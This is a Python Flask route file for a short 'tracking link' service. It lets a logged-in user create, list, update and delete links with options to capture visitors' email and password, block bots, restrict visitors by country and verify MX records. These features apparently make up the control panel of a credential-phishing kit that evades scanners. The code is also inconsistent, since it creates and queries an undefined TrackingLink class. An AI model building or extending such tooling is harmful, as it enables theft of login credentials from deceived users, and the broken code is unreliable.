from flask import Blueprint, request, jsonify, session
from src.models.user import db, User
from src.models.link import Link
from src.models.tracking_event import TrackingEvent
import string
import random
import json

links_bp = Blueprint('links', __name__)

def require_auth():
    if 'user_id' not in session:
        return None
    return User.query.get(session['user_id'])

def generate_short_code(length=8):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def sanitize_input(text):
    if not text:
        return ''
    return text.strip()

@links_bp.route('/links', methods=['GET', 'POST', 'PUT', 'DELETE'])
def links():
    user = require_auth()
    if not user:
        return jsonify({'success': False, 'error': 'Authentication required'}), 401
    
    if request.method == 'GET':
        # Get all links for the current user
        links = Link.query.filter_by(user_id=user.id).order_by(Link.created_at.desc()).all()
        
        links_data = []
        for link in links:
            link_dict = link.to_dict()
            # Get analytics data
            total_clicks = TrackingEvent.query.filter_by(link_id=link.id).count()
            real_visitors = TrackingEvent.query.filter_by(link_id=link.id, is_bot=False).count()
            blocked_attempts = TrackingEvent.query.filter_by(link_id=link.id, status="blocked").count()

            link_dict.update({
                "total_clicks": total_clicks,
                "real_visitors": real_visitors,
                "blocked_attempts": blocked_attempts
            })
            
            # Add tracking URL
            link_dict['tracking_url'] = f"https://{request.host}/t/{link.short_code}"
            links_data.append(link_dict)
        
        return jsonify({'links': links_data})
    
    elif request.method == 'POST':
        # Create a new tracking link
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'}), 400
        
        target_url = sanitize_input(data.get('target_url', ''))
        capture_email = data.get('capture_email', False)
        capture_password = data.get('capture_password', False)
        bot_blocking_enabled = data.get('bot_blocking_enabled', True)
        geo_targeting_enabled = data.get('geo_targeting_enabled', False)
        allowed_countries = data.get('allowed_countries')
        rate_limiting_enabled = data.get('rate_limiting_enabled', False)
        dynamic_signature_enabled = data.get('dynamic_signature_enabled', False)
        mx_verification_enabled = data.get('mx_verification_enabled', False)
        preview_template_url = sanitize_input(data.get('preview_template_url', ''))
        
        if not target_url:
            return jsonify({'success': False, 'error': 'Target URL is required'}), 400
        
        if not target_url.startswith(('http://', 'https://')):
            return jsonify({'success': False, 'error': 'Invalid target URL'}), 400
        
        # Generate unique short code
        while True:
            short_code = generate_short_code()
            existing = Link.query.filter_by(short_code=short_code).first()
            if not existing:
                break
        
        try:
            link = TrackingLink(
                user_id=user.id,
                short_code=short_code,
                target_url=target_url,
                capture_email=capture_email,
                capture_password=capture_password,
                bot_blocking_enabled=bot_blocking_enabled,
                geo_targeting_enabled=geo_targeting_enabled,
                allowed_countries=json.dumps(allowed_countries) if allowed_countries else None,
                rate_limiting_enabled=rate_limiting_enabled,
                dynamic_signature_enabled=dynamic_signature_enabled,
                mx_verification_enabled=mx_verification_enabled,
                preview_template_url=preview_template_url
            )
            
            db.session.add(link)
            db.session.commit()
            

            
            return jsonify({
                'success': True,
                'message': 'Tracking link created successfully',
                'link': {
                    'id': link.id,
                    'short_code': short_code,
                    'tracking_url': f"https://{request.host}/t/{short_code}",
                    'target_url': target_url
                }
            })
        except Exception as e:
            db.session.rollback()
            return jsonify({'success': False, 'error': 'Failed to create tracking link'}), 500
    
    elif request.method == 'PUT':
        # Update an existing tracking link
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'}), 400
        
        link_id = data.get('id')
        if not link_id:
            return jsonify({'success': False, 'error': 'Link ID is required'}), 400
        
        link = TrackingLink.query.filter_by(id=link_id, user_id=user.id).first()
        if not link:
            return jsonify({'success': False, 'error': 'Link not found or access denied'}), 404
        
        target_url = sanitize_input(data.get('target_url', ''))
        if not target_url:
            return jsonify({'success': False, 'error': 'Target URL is required'}), 400
        
        if not target_url.startswith(('http://', 'https://')):
            return jsonify({'success': False, 'error': 'Invalid target URL'}), 400
        
        try:
            link.target_url = target_url
            link.capture_email = data.get('capture_email', False)
            link.capture_password = data.get('capture_password', False)
            link.bot_blocking_enabled = data.get('bot_blocking_enabled', True)
            link.geo_targeting_enabled = data.get('geo_targeting_enabled', False)
            link.allowed_countries = json.dumps(data.get('allowed_countries')) if data.get('allowed_countries') else None
            link.rate_limiting_enabled = data.get('rate_limiting_enabled', False)
            link.dynamic_signature_enabled = data.get('dynamic_signature_enabled', False)
            link.mx_verification_enabled = data.get('mx_verification_enabled', False)
            link.preview_template_url = sanitize_input(data.get('preview_template_url', ''))
            
            db.session.commit()
            
            return jsonify({
                'success': True,
                'message': 'Tracking link updated successfully'
            })
        except Exception as e:
            db.session.rollback()
            return jsonify({'success': False, 'error': 'Failed to update tracking link'}), 500
    
    elif request.method == 'DELETE':
        # Delete a tracking link
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'}), 400
        
        link_id = data.get('id')
        if not link_id:
            return jsonify({'success': False, 'error': 'Link ID is required'}), 400
        
        link = TrackingLink.query.filter_by(id=link_id, user_id=user.id).first()
        if not link:
            return jsonify({'success': False, 'error': 'Link not found or access denied'}), 404
        
        try:
            db.session.delete(link)
            db.session.commit()
            
            return jsonify({
                'success': True,
                'message': 'Tracking link deleted successfully'
            })
        except Exception as e:
            db.session.rollback()
            return jsonify({'success': False, 'error': 'Failed to delete tracking link'}), 500

